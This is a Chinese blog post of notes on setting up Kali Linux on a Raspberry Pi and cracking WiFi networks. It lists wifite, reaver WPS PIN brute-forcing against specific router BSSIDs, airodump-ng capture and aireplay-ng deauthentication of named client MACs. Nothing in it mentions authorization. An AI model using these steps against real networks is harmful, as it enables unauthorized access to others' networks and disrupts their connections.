---
layout: post
title: 在树莓派上使用 Kali 进行"渗透测试"
category: Linux
tags: [Kali, 树莓派, 渗透测试]
latest: 2015年12月4日 14:10:44
---

Kali 是 BT 的前身，在渗透领域目前还没有发现比 Kali 更专业的 Linux 了。

Kali for Raspberry
-

在 Linux 虚拟机或者 Live 镜像中刻录 Kali 镜像到 MiniSD/TF 卡：

```
dd if=kali-pi.img of=/dev/sdb bs=512k
```

- **如何查看 U 盘挂载那个文件上了？Sdb sdb2 sdb1 ?**

- **开启远程桌面服务**

```
$ sudo apt-get install xrdp
$ sudo service xrdp start
```

- **用一条网线连接树莓派和笔记本**

`arp -a` 后 `192.168.137.1` 下面不一定非是动态的才是树莓派上 Kali 获得的 IP，静态的也有可能

```
apt-get clean && apt-get update && apt-get upgrade -y && apt-get dist-upgrade -y
```

树莓派跑 pin
-

```
lsusb

apt-get install screen    # 为了可以 SSH 离线

apt-get install cowpatty 	# 不安装运行该程序的时候会提示

iwconfig

screen

wifite
```

寻找绿色信号的 带有wpa/wpa2 标志的、带有wps标志的目标。
 
然后天线找到最佳位置后按 ctrl+c，在下面新出现的一行输入你选定的目标行号，回车确定后就开始了自动探测。

破解时间快的话甚至可以秒破，慢的话就不好说了。

`~` 目录下将保存 wifi 的密码。


- **使用 reaver 破解开启 wps 功能的路由器密码**

```
reaver  -i  mon0  -b 8C:21:0A:5F:A2:FA  -a  -S  -vv  -d2  -t 5 -c 1
airmon-ng start wlan0
airodump-ng mon0
```

Aircrack-ng
-

```
sudo airmon-ng start wlan0
sudo airodump-ng wlan0mon

airmon-ng start wifi0 9

reaver -i mon0 -b F8:D1:11:31:50:24 -vv -c 6 -p 88948935
```

- **搜索不到无线?**

重置网络。

- **执行 `airmon-ng start wlan0` 提示错误，执行 `airodump wlan0mon`失败?**

```
sudo apt-get install rfkill
```

- Failed to associate with … …

- Request occur timeout … …

```
airodump-ng -c 6 –w wpa-wps wlan0mon

aireplay-ng -0 10 -a 50:BD:5F:0F:B9:BA -c BC:3A:EA:60:6C:61 wlan0mon
```

Screen 的使用
-

```
screen -S cracking    # 开启一个离线任务
screen -r cracking    # 恢复一个离线任务
exit                  # 退出 screen 会话
screen -ls            # 查看所有 screen 会话
screen -wipe          # 删除会话
```
参考
-

- <http://os.ctocio.com.cn/68/12957068.shtml>

- <http://shumeipai.nxez.com/2013/10/15/raspberry-pi-and-a-network-cable-directly-connected-laptop.html>

- <http://www.aircrack-ng.org/doku.php?id=faq#where_can_i_find_good_wordlists>

- <http://www.oschina.net/question/12_7909>

- <http://www.aircrack-ng.org/doku.php?id=cracking_wpa>

- <http://www.openwall.com/john/>

- [树莓派(raspberrypi)安装aircrack-ng,reaver及wifi破解教程[整理] | FindSpace](http://www.findspace.name/res/1184)
